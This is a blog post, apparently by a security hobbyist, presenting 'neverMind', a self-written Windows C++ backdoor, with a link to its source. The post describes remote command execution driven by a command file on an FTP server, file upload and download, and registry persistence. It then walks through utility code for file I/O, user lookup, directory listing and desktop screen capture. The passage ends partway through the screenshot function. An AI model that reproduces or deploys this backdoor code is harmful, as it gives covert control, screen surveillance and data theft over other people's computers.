<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="neverMind">

    
        <title>neverMind | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    neverMind
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 18, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#overview">overview</a></li>
    <li><a href="#flow">flow</a></li>
    <li><a href="#code">code</a>
      <ul>
        <li><a href="#the-wrapper">the wrapper</a></li>
        <li><a href="#ftpc">ftpC</a></li>
        <li><a href="#nevermind">neverMind</a></li>
        <li><a href="#main">main</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">conclusion</a></li>
  </ul>
</nav>
</aside>


<main><p><p class="imgp">
  <img loading="lazy" src="/neverMind.png" alt="neverMind"  />
</p>
</p>
<p>as part of a post-layoff glow-up, i began to delve deeper into programming and building my own tools. a lot of these tools are based on specific actions, like attacks, analysis, etc. one thing i&rsquo;ve always been fascinated with though is object-oriented programming used to build applications from the ground up, specifically backdoors.</p>
<p>backdoors are often used for securing remote access to a computer. they&rsquo;re used for legitimate purposes, like by system administrators for system management (fix issues, install updates, perform maintenance) without being physically present. however, one need only hop a short distance from legitimate purposes to malicious activities, as hackers often use backdoors to steal sensitive data, install additional malware, and launch attacks against other systems.</p>
<p>so i wrote one myself.</p>
<p><strong><code>neverMind</code></strong> is a backdoor that allows remote command execution (aka <strong>RCE</strong>) on a target system via FTP (file transfer protocol). view the source code <a href="https://github.com/bilals12/neverMind/tree/main"  target="_blank" rel="noreferrer nofollow">here</a>
 and follow along!</p>
<h2 id="overview">overview</h2>
<p>the gist of how <code>neverMind</code> works is simple: the program is controlled remotely via commands stored in text file on an FTP server. for this, 2 basic conditions need to be fulfilled:</p>
<ol>
<li>
<p>the program needs an FTP server to be set up with a specific directory structure. inside this directory, there needs to be a file (named <code>cmd.txt</code> for example) that contains the commands to be executed.</p>
</li>
<li>
<p>the <code>cmd.txt</code> file needs to have each line representing a separate command. the program supports several commands: <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>.</p>
</li>
</ol>
<h2 id="flow">flow</h2>
<p><strong>initialization</strong>: the program begins by creating an instance of the <code>neverMind</code> class, which takes the FTP server&rsquo;s host, username, and password as parameters. this instance is used to manage the backdoor&rsquo;s operations.</p>
<p><strong>setup</strong>: if the backdoor hasn&rsquo;t been set up before, the <code>setup</code> method in the <code>neverMind</code> class creates the necessary directories and adds the backdoor to the registry for persistence.</p>
<p><strong>command execution</strong>: the <code>start</code> method in the <code>neverMind</code> class is the main driver of the program. it connects to the FTP server, downloads the <code>cmd.txt</code> file, compiles + executes the commands, and then uploads the <code>output.txt</code> file.</p>
<p><strong>command compilation</strong>: the <code>compile</code> method reads the <code>cmd.txt</code> file, splits each line into a vector of strings, and then executes each command.</p>
<p><strong>command handling</strong>: the <code>execute</code> method takes a vector of strings as input and executes the corresponding command. the supported commands are the same as above: <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>.</p>
<p><strong>FTP operations</strong>: the <code>neverMind</code> class uses an instance of the <code>ftpC</code> class to handle FTP operations, including connecting to the server, uploading/downloading files, and creating/switching directories.</p>
<p><strong>utility functions</strong>: the <code>wrapper</code> class provides utility functions for file I/O, error handling, directory listing, random string generation, date retrieval, bitmap creation, screen capturing, and memory saving.</p>
<p><strong>persistence</strong>: the program adds itself to the registry to ensure it runs every time the system starts.</p>
<p><strong>cleanup</strong>: when the program is done, it closes the FTP + internet connections in the <code>ftpC</code> class destructor.</p>
<h2 id="code">code</h2>
<h3 id="the-wrapper">the wrapper</h3>
<p>the <code>wrapper</code> class defined in <code>wrapper.h</code> and implemented in <code>wrapper.cpp</code> provides a set of utility functions for file operations, system information retrieval, and screen capture.</p>
<h4 id="file-operations">file operations</h4>
<p><code>read_file(const std::string&amp; file_path)</code>: reads the content of a file located at <code>file_path</code> and returns it as a string. If the file cannot be opened, it throws a <code>FileError</code> exception.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>read_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>file_path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ifstream file(file_path);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>file.is_open())
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> FileError(<span style="color:#f1fa8c">&#34;[!] failed to open file: &#34;</span> <span style="color:#ff79c6">+</span> file_path);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string text;
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string line;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (std<span style="color:#ff79c6">::</span>getline(file, line)) {
</span></span><span style="display:flex;"><span>            text <span style="color:#ff79c6">+=</span> line <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> text;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>write_file(const std::string&amp; file_path, const std::string&amp; content)</code>: writes content to a file located at <code>file_path</code>. if the file cannot be opened, it throws a <code>FileError</code> exception.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> wrapper<span style="color:#ff79c6">::</span>write_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>file_path, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string <span style="color:#ff79c6">&amp;</span>content)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ofstream file(file_path);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>file.is_open())
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> FileError(<span style="color:#f1fa8c">&#34;[!] failed to open file: &#34;</span> <span style="color:#ff79c6">+</span> file_path);
</span></span><span style="display:flex;"><span>        file <span style="color:#ff79c6">&lt;&lt;</span> content;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>append_file(const std::string&amp; file_path, const std::string&amp; content)</code>: appends content to a file located at <code>file_path</code>. if the file cannot be opened, it throws a <code>FileError</code> exception.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> wrapper<span style="color:#ff79c6">::</span>append_file(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> file_path, <span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> content)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ofstream file(file_path, std<span style="color:#ff79c6">::</span>ios_base<span style="color:#ff79c6">::</span>app);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>file.is_open())
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">throw</span> FileError(<span style="color:#f1fa8c">&#34;[!] failed to open file: &#34;</span> <span style="color:#ff79c6">+</span> file_path);
</span></span><span style="display:flex;"><span>        file <span style="color:#ff79c6">&lt;&lt;</span> content;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>path_exists(const std::string&amp; path)</code>: checks if a path exists in the file system and returns a boolean value indicating the result.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> wrapper<span style="color:#ff79c6">::</span>path_exists(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>exists(path);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="system-information-retrieval">system information retrieval</h4>
<p><code>get_username()</code>: retrieves the username of the current user from the environment variables.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>get_username()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">char</span> env[] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;USERNAME&#34;</span>;
</span></span><span style="display:flex;"><span>        DWORD username_len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">257</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">4096</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> out_size <span style="color:#ff79c6">=</span> GetEnvironmentVariableA(env, buffer, username_len);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> std<span style="color:#ff79c6">::</span>string(buffer, out_size);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>last_error_string()</code>: Retrieves the last error message recorded by the system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>last_error_string()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        DWORD errorMessageID <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">::</span>GetLastError();
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (errorMessageID <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> std<span style="color:#ff79c6">::</span>string(); <span style="color:#6272a4">// no error recorded
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        LPSTR messageBuffer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">nullptr</span>;
</span></span><span style="display:flex;"><span>        size_t size <span style="color:#ff79c6">=</span> FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_FROM_SYSTEM <span style="color:#ff79c6">|</span> FORMAT_MESSAGE_IGNORE_INSERTS, <span style="color:#8be9fd;font-style:italic">NULL</span>, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)<span style="color:#ff79c6">&amp;</span>messageBuffer, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>string message(messageBuffer, size);
</span></span><span style="display:flex;"><span>        LocalFree(messageBuffer); <span style="color:#6272a4">// free up the buffer
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">return</span> message;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>listdir(const std::string&amp; path)</code>: Lists the contents of a directory specified by path and returns them as a vector of strings.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&gt;</span> wrapper<span style="color:#ff79c6">::</span>listdir(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> path)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&gt;</span> directory_content;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> (<span style="color:#ff79c6">const</span> <span style="color:#ff79c6">auto</span><span style="color:#ff79c6">&amp;</span> <span style="color:#8be9fd;font-style:italic">val</span> : std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>directory_iterator(path)) {
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>string content <span style="color:#ff79c6">=</span> val.path().u8string();
</span></span><span style="display:flex;"><span>            std<span style="color:#ff79c6">::</span>size_t last_idx <span style="color:#ff79c6">=</span> content.find_last_of(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>            directory_content.push_back(content.substr(last_idx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> directory_content;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>get_date()</code>: Returns the current date and time as a string in the format &ldquo;dd-mm-yyyy_hh-mm-ss&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>get_date()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">auto</span> t <span style="color:#ff79c6">=</span> std<span style="color:#ff79c6">::</span>time(<span style="color:#ff79c6">nullptr</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">auto</span> tm <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>std<span style="color:#ff79c6">::</span>localtime(<span style="color:#ff79c6">&amp;</span>t);
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ostringstream oss;
</span></span><span style="display:flex;"><span>        oss <span style="color:#ff79c6">&lt;&lt;</span> std<span style="color:#ff79c6">::</span>put_time(<span style="color:#ff79c6">&amp;</span>tm, <span style="color:#f1fa8c">&#34;%d-%m-%Y_%H-%M-%S&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> oss.str();
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="screen-capture">screen capture</h4>
<p><code>createBitmapHeader(int width, int height)</code>: creates a bitmap header with the specified width and height.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>BITMAPINFOHEADER wrapper<span style="color:#ff79c6">::</span>createBitmapHeader(<span style="color:#8be9fd">int</span> width, <span style="color:#8be9fd">int</span> height)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    BITMAPINFOHEADER bi;
</span></span><span style="display:flex;"><span>    bi.biSize <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">sizeof</span>(BITMAPINFOHEADER);
</span></span><span style="display:flex;"><span>    bi.biWidth <span style="color:#ff79c6">=</span> width;
</span></span><span style="display:flex;"><span>    bi.biHeight <span style="color:#ff79c6">=</span> height;
</span></span><span style="display:flex;"><span>    bi.biPlanes <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    bi.biBitCount <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">32</span>;
</span></span><span style="display:flex;"><span>    bi.biCompression <span style="color:#ff79c6">=</span> BI_RGB;
</span></span><span style="display:flex;"><span>    bi.biSizeImage <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    bi.biXPelsPerMeter <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    bi.biYPelsPerMeter <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    bi.biClrUsed <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    bi.biClrImportant <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> bi;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>GdiPlusScreenCapture(HWND hWnd)</code>: captures the screen of the window specified by <code>hWnd</code> and returns a handle to the bitmap of the screenshot.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>HBITMAP wrapper<span style="color:#ff79c6">::</span>GdiPlusScreenCapture(HWND hWnd)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    HDC hwindowDC <span style="color:#ff79c6">=</span> GetDC(hWnd);
</span></span><span style="display:flex;"><span>    HDC hwindowCompatibleDC <span style="color:#ff79c6">=</span> CreateCompatibleDC(hwindowDC);
</span></span><span style="display:flex;"><span>    SetStretchBltMode(hwindowCompatibleDC, COLORONCOLOR);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> scale <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> screenx <span style="color:#ff79c6">=</span> GetSystemMetrics(SM_XVIRTUALSCREEN);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> screeny <span style="color:#ff79c6">=</span> GetSystemMetrics(SM_YVIRTUALSCREEN);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> width <span style="color:#ff79c6">=</span> GetSystemMetrics(SM_CXVIRTUALSCREEN);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> height <span style="color:#ff79c6">=</span> GetSystemMetrics(SM_CYVIRTUALSCREEN);
</span></span><span style="display:flex;"><span>    HBITMAP hbwindow <span style="color:#ff79c6">=</span> CreateCompatibleBitmap(hwindowDC, width, height);
</span></span><span style="display:flex;"><span>    BITMAPINFOHEADER bi <span style="color:#ff79c6">=</span> wrapper<span style="color:#ff79c6">::</span>createBitmapHeader(width, height);
</span></span><span style="display:flex;"><span>    SelectObject(hwindowCompatibleDC, hbwindow);
</span></span><span style="display:flex;"><span>    StretchBlt(hwindowCompatibleDC, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, width, height, hwindowDC, screenx, screeny, width, height, SRCCOPY);
</span></span><span style="display:flex;"><span>    GetDIBits(hwindowCompatibleDC, hbwindow, <span style="color:#bd93f9">0</span>, height, lpbitmap, (BITMAPINFO<span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>bi, DIB_RGB_COLORS);
</span></span><span style="display:flex;"><span>    DeleteDC(hwindowCompatibleDC);
</span></span><span style="display:flex;"><span>    ReleaseDC(hWnd, hwindowDC);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> hbwindow;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>saveToMemory(HBITMAP* hbitmap, std::vector&lt;BYTE&gt;&amp; data, std::string dataFormat)</code>: saves a bitmap specified by <code>hbitmap</code> to memory in the format specified by <code>dataFormat</code> and stores the data in data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> wrapper<span style="color:#ff79c6">::</span>saveToMemory(HBITMAP<span style="color:#ff79c6">*</span> hbitmap, std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>BYTE<span style="color:#ff79c6">&gt;&amp;</span> data, std<span style="color:#ff79c6">::</span>string dataFormat)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    Gdiplus<span style="color:#ff79c6">::</span>Bitmap bmp(<span style="color:#ff79c6">*</span>hbitmap, <span style="color:#ff79c6">nullptr</span>);
</span></span><span style="display:flex;"><span>    IStream<span style="color:#ff79c6">*</span> istream <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">nullptr</span>;
</span></span><span style="display:flex;"><span>    CreateStreamOnHGlobal(<span style="color:#8be9fd;font-style:italic">NULL</span>, TRUE, <span style="color:#ff79c6">&amp;</span>istream);
</span></span><span style="display:flex;"><span>    CLSID clsid;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;bmp&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf400-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;jpg&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf401-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;gif&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf402-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;tif&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf405-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (dataFormat.compare(<span style="color:#f1fa8c">&#34;png&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) { CLSIDFromString(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;{557cf406-1a04-11d3-9a73-0000f81ef32e}&#34;</span>, <span style="color:#ff79c6">&amp;</span>clsid); }
</span></span><span style="display:flex;"><span>    Gdiplus<span style="color:#ff79c6">::</span>Status status <span style="color:#ff79c6">=</span> bmp.Save(istream, <span style="color:#ff79c6">&amp;</span>clsid, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (status <span style="color:#ff79c6">!=</span> Gdiplus<span style="color:#ff79c6">::</span>Status<span style="color:#ff79c6">::</span>Ok)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">false</span>;
</span></span><span style="display:flex;"><span>    HGLOBAL hg <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>;
</span></span><span style="display:flex;"><span>    GetHGlobalFromStream(istream, <span style="color:#ff79c6">&amp;</span>hg);
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> bufsize <span style="color:#ff79c6">=</span> GlobalSize(hg);
</span></span><span style="display:flex;"><span>    data.resize(bufsize);
</span></span><span style="display:flex;"><span>    LPVOID pimage <span style="color:#ff79c6">=</span> GlobalLock(hg);
</span></span><span style="display:flex;"><span>    memcpy(<span style="color:#ff79c6">&amp;</span>data[<span style="color:#bd93f9">0</span>], pimage, bufsize);
</span></span><span style="display:flex;"><span>    GlobalUnlock(hg);
</span></span><span style="display:flex;"><span>    istream<span style="color:#ff79c6">-&gt;</span>Release();
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>screenshot(const std::string&amp; path)</code>: takes a screenshot, saves it as a JPEG file in the directory specified by path, and returns the full path of the screenshot file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff79c6">::</span>string wrapper<span style="color:#ff79c6">::</span>screenshot(<span style="color:#ff79c6">const</span> std<span style="color:#ff79c6">::</span>string<span style="color:#ff79c6">&amp;</span> path)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    std<span style="color:#ff79c6">::</span>string full_path <span style="color:#ff79c6">=</span> (std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path(path) <span style="color:#ff79c6">/</span> std<span style="color:#ff79c6">::</span>filesystem<span style="color:#ff79c6">::</span>path((wrapper<span style="color:#ff79c6">::</span>get_date() <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;.jpg&#34;</span>))).u8string();
</span></span><span style="display:flex;"><span>    GdiplusStartupInput gdiplusStartupInput;
</span></span><span style="display:flex;"><span>    ULONG_PTR gdiplusToken;
</span></span><span style="display:flex;"><span>    GdiplusStartup(<span style="color:#ff79c6">&amp;</span>gdiplusToken, <span style="color:#ff79c6">&amp;</span>gdiplusStartupInput, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>    HWND hWnd <span style="color:#ff79c6">=</span> GetDesktopWindow();
</span></span><span style="display:flex;"><span>    HBITMAP hBmp <span style="color:#ff79c6">=</span> wrapper<span style="color:#ff79c6">::</span>GdiPlusScreenCapture(hWnd);
</span></span><span style="display:flex;"><span>    std<span style="color:#ff79c6">::</span>vector<span style="color:#ff79c6">&lt;</span>BYTE<span style="color:#ff79c6">&gt;</span> data;
</span></span><span style="display:flex;"><span>    std<span style="color:#ff79c6">::</span>string dataFormat <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;jpg&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (wrapper<span style="color:#ff79c6">::</span>saveToMemory(<span style="color:#ff79c6">&amp;</span>hBmp, data, dataFormat))
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        std<span style="color:#ff79c6">::</span>ofstream fout(full_path, std<span style="color:#ff79c6">::</span>ios<span style="color:#ff79c6">::</span>binary);
</span></span><span style="display:flex;"><span>        fout.write((<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data.data(), data.size());
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
